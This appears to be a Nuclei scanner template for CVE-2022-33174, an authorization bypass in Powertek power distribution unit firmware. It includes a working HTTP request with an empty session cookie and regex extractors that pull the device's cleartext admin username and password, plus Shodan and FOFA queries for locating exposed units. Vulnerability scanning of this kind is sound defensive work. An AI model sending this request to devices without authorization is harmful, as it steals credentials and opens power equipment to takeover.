http:
- extractors:
  - group: 1
    part: body
    regex:
    - <sys\.passwd>([A-Z0-9a-z]+)<\/sys\.passwd>
    - <sys\.su\.name>([a-z]+)<\/sys\.su\.name>
    type: regex
  matchers:
  - type: word
    words:
    - <sys.passwd>
    - <sys.su.name>
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'GET /cgi/get_param.cgi?xml&sys.passwd&sys.su.name HTTP/1.1

    Host: {{Hostname}}

    Cookie: tmpToken=;

    '
id: CVE-2022-33174
info:
  author: pikpikcu
  classification:
    cpe: cpe:2.3:o:powertekpdus:basic_pdu_firmware:*:*:*:*:*:*:*:*
    cve-id: CVE-2022-33174
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    cwe-id: CWE-863
    epss-percentile: 0.99145
    epss-score: 0.81715
  description: 'Powertek firmware (multiple brands) before 3.30.30 running Power Distribution
    Units are vulnerable to authorization bypass in the web interface. To exploit
    the vulnerability, an attacker must send an HTTP packet to the data retrieval
    interface (/cgi/get_param.cgi) with the tmpToken cookie set to an empty string
    followed by a semicolon. This bypasses an active session authorization check.
    This can be then used to fetch the values of protected sys.passwd and sys.su.name
    fields that contain the username and password in cleartext.

    '
  impact: 'An attacker can bypass authentication and gain unauthorized access to the
    Powertek Firmware, potentially leading to further compromise of the system.

    '
  metadata:
    fofa-query: body="powertek"
    max-request: 1
    product: basic_pdu_firmware
    shodan-query:
    - http.html:"Powertek"
    - http.html:"powertek"
    vendor: powertekpdus
    verified: true
  name: Powertek Firmware <3.30.30 - Authorization Bypass
  reference:
  - https://gynvael.coldwind.pl/?lang=en&id=748
  - https://nvd.nist.gov/vuln/detail/CVE-2022-33174
  - https://github.com/Henry4E36/CVE-2022-33174
  - https://github.com/k0mi-tg/CVE-POC
  - https://github.com/nomi-sec/PoC-in-GitHub
  remediation: 'Upgrade the Powertek Firmware to version 3.30.30 or higher to mitigate
    the vulnerability.

    '
  severity: high
  tags: cve2022,cve,powertek,auth-bypass,powertekpdus,vuln
